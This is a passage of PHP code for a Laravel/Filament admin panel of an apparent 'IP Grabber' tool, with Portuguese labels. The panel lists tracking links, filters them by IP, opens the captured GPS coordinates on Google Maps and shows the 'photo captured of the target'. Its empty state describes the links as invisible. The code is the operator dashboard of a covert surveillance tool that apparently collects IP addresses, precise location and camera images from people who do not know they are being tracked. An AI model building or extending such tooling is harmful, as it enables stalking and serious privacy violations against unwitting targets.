                        'aguardando' => $query->whereNull('clicked_at'),
                        default => $query,
                    }),
                Tables\Filters\Filter::make('ip')
                    ->label('IP')
                    ->form([Forms\Components\TextInput::make('ip')->placeholder('ex: 200.100.50.10')])
                    ->query(fn (Builder $query, array $data) => ($value = trim((string) ($data['ip'] ?? ''))) === '' ? $query : $query->where('ip', 'like', "%{$value}%")),
                Tables\Filters\Filter::make('label')
                    ->label('Identificação')
                    ->form([Forms\Components\TextInput::make('label')->placeholder('Buscar por rótulo...')])
                    ->query(fn (Builder $query, array $data) => ($value = trim((string) ($data['label'] ?? ''))) === '' ? $query : $query->where('label', 'like', "%{$value}%")),
            ])
            ->recordActions([
                Actions\ViewAction::make()->label('Histórico')->icon('heroicon-o-clock'),
                Actions\Action::make('ver_mapa_gps')
                    ->label('GPS')
                    ->icon('heroicon-o-map-pin')
                    ->color('info')
                    ->visible(fn (IpGrabber $record) => $record->gps_latitude !== null)
                    ->url(fn (IpGrabber $record) => "https://www.google.com/maps?q={$record->gps_latitude},{$record->gps_longitude}")
                    ->openUrlInNewTab(),

                Actions\Action::make('ver_foto')
                    ->label('Foto')
                    ->icon('heroicon-o-camera')
                    ->color('success')
                    ->visible(fn (IpGrabber $record) => ($record->fotos_count ?? 0) > 0)
                    ->modalHeading('Foto capturada do alvo')
                    ->modalContent(function (IpGrabber $record): HtmlString {
                        /** @var IpGrabberFoto|null $foto */
                        $foto = $record->fotos()->first();

                        if (! $foto) {
                            return new HtmlString(
                                '<div class="flex flex-col items-center gap-2 py-8 text-gray-400">'
                                . '<svg xmlns="http://www.w3.org/2000/svg" class="w-12 h-12 opacity-30" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M6.827 6.175A2.31 2.31 0 0 1 5.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 0 0-1.134-.175 2.31 2.31 0 0 1-1.64-1.055l-.822-1.316a2.192 2.192 0 0 0-1.736-1.039 48.774 48.774 0 0 0-5.232 0 2.192 2.192 0 0 0-1.736 1.039l-.821 1.316Z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M16.5 12.75a4.5 4.5 0 1 1-9 0 4.5 4.5 0 0 1 9 0ZM18.75 10.5h.008v.008h-.008V10.5Z"/></svg>'
                                . '<p class="text-sm">Nenhuma foto capturada ainda.</p>'
                                . '</div>'
                            );
                        }

                        $url   = e(Storage::disk('public')->url($foto->path));
                        $total = $record->fotos()->count();
                        $info  = $foto->created_at
                            ? $foto->created_at->timezone('America/Sao_Paulo')->format('d/m/Y H:i:s')
                            : '—';

                        return new HtmlString(<<<HTML
                            <div class="flex flex-col items-center gap-3 py-2">
                                <img
                                    src="{$url}"
                                    alt="Foto capturada"
                                    style="max-width:100%;max-height:65vh;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.18);"
                                >
                                <p class="text-xs text-gray-400">Capturada em {$info} &middot; {$total} foto(s) no total</p>
                                <a
                                    href="{$url}"
                                    target="_blank"
                                    rel="noopener"
                                    class="text-xs text-primary-600 hover:underline"
                                >Abrir em tamanho original ↗</a>
                            </div>
                        HTML);
                    })
                    ->modalSubmitAction(false)
                    ->modalCancelActionLabel('Fechar'),

                Actions\DeleteAction::make()->label('Excluir'),
            ])
            ->emptyStateHeading('Nenhum link criado')
            ->emptyStateDescription('Crie um IP Grabber para gerar um link invisível.')
            ->emptyStateIcon('heroicon-o-eye-slash');
    }
}
